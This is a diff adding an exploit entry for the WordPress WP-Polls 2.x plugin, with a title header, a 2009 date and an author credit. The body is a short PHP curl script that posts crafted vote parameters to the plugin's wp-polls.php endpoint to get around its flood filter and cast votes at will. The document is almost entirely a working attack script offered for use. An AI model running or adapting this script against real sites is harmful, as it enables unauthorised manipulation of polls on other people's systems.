@@ -1,0 +1,17 @@
+# Exploit Title: WP-Polls 2.x Incorrect Flood Filter
+# Date: 30/11/2009
+# Author: Jbyte (jbyte-security.blogspot.com)
+# Software Link: http://lesterchan.net/wordpress/readme/wp-polls.html
+# Version: 2.x
+# Tested on: Windows 7/windows xp/ ubuntu 9.04/ ubuntu 9.10
+# Code :
+
+<?php
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http://server/wp-content/plugins/wp-polls/wp-polls.php");
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_POSTFIELDS,"vote=true&poll_id=ID survey here&poll_7=ID to vote here");
+curl_exec($ch);
+
+curl_close($ch);
+?>
